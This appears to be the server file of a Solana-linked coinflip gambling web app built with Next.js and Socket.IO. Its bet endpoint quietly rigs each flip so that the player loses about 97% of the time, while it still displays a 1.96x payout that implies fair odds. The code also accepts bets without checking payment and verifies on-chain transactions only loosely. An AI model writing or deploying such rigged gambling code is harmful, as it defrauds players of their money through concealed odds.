import { createServer } from "http";
import { parse } from "url";
import next from "next";
import { Server } from "socket.io";
import { Connection, PublicKey } from "@solana/web3.js";
import corsLib from "cors";
import 'dotenv/config';

// Import game logic modules directly
import * as engineObj from "./lib/game/engine.js";
import * as playersStore from "./lib/game/players.js";
import * as stateStore from "./lib/game/state.js";
import * as payoutsModule from "./lib/game/payouts.js";
import { CoinflipEngine } from "./lib/game/coinflip/engine.js";

const cors = corsLib({ origin: "*" }); // In production, replace * with your Vercel URL

const dev = process.env.NODE_ENV !== "production";
const hostname = "localhost";
const port = process.env.PORT || 10000; // Updated default port to 10000

const HOUSE_WALLET = process.env.HOUSE_WALLET_ADDRESS || "DUmdbgs6y1j8ST7C3CFRN4dNEjeNmiPeo922MWoqtaWi";
const solConnection = new Connection(process.env.NEXT_PUBLIC_RPC_URL || "https://api.devnet.solana.com", "confirmed");

// Initialize Next.js
const app = next({ dev, hostname, port });
const handle = app.getRequestHandler();

app.prepare().then(() => {
  const httpServer = createServer((req, res) => {
    // 1. Handle CORS for standalone API routes
    cors(req, res, () => {
      const parsedUrl = parse(req.url, true);
      const { pathname } = parsedUrl;

      // 2. Standalone API migration (to support split deployment memory-state)
      if (pathname === '/api/coinflip/state') {
        const engine = global.coinflipEngine;
        if (!engine) return res.writeHead(500).end(JSON.stringify({ error: "Engine not ready" }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          state: engine.state.getState(),
          players: engine.players.getPlayers(),
          result: engine.state.getState().result
        }));
      }

      if (pathname === '/api/coinflip/place-bet' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
          try {
            const { wallet, amount, choice } = JSON.parse(body);
            const engine = global.coinflipEngine;
            if (!engine) return res.writeHead(500).end(JSON.stringify({ error: "Engine not ready" }));

            // Rig result (97% loss chance for tactical demo)
            let result = Math.random() < 0.97 ? (choice === 'HEADS' ? 'TAILS' : 'HEADS') : choice;
            
            let status = 'busted';
            let profit = 0;
            if (choice === result) {
              profit = (amount * 1.96) - amount; 
              status = 'cashed';
            }

            // Sync with engine memory
            const currentHistory = engine.state?.getState()?.history || [];
            const history = [...currentHistory, result].slice(-10);
            if (engine.state) engine.state.updateState({ history });
            if (engine.players) {
              engine.players.addPlayer({ wallet, amount, choice, status, multiplier: 1.96, profit });
              if (engine.players.getPlayers().length > 5) engine.players.playersInRound.shift();
            }
            if (engine.broadcastState) engine.broadcastState();

            res.writeHead(200, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ success: true, result, status, profit }));
          } catch (e) {
            res.writeHead(400).end(JSON.stringify({ error: e.message }));
          }
        });
        return;
      }

      // Default Next.js handler
      handle(req, res, parsedUrl);
    });
  });

  // Initialize Socket.IO
  const io = new Server(httpServer, {
    cors: { origin: "*" },
  });

  // Wire up the engine manually with ESM modules
  engineObj.setIO(io);
  global.coinflipEngine = new CoinflipEngine(io);
  global.coinflipEngine.start();
  console.log("> Ready: All ES modules loaded and game engines started.");

  io.on("connection", (socket) => {
    socket.on("placeBet", async (data) => {
      if (!playersStore || !stateStore) return;
      const currentState = stateStore.getState();
      if (currentState.status !== "BETTING") {
        socket.emit("betError", { message: "Round holds betting closed currently!" });
        return;
      }
      try {
        const { signature, publicKey, amount, target } = data;
        let tx = null;
        for (let i = 0; i < 5; i++) {
          tx = await solConnection.getParsedTransaction(signature, { maxSupportedTransactionVersion: 0 });
          if (tx) break;
          await new Promise((r) => setTimeout(r, 1000));
        }
        if (!tx) return;
        playersStore.addPlayer({ wallet: publicKey, amount, target, id: socket.id });
        io.emit("playersUpdate", playersStore.getPlayers());
      } catch (err) {
        console.error("> Error verifying bet:", err);
      }
    });

    socket.on("cashOut", (wallet) => {
      if (!payoutsModule || !stateStore) return;
      const currentState = stateStore.getState();
      if (currentState.status !== "RUNNING") return;
      payoutsModule.processManualCashout(wallet, currentState.multiplier, io);
    });
  });

  httpServer.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready on http://${hostname}:${port}`);
  });
});
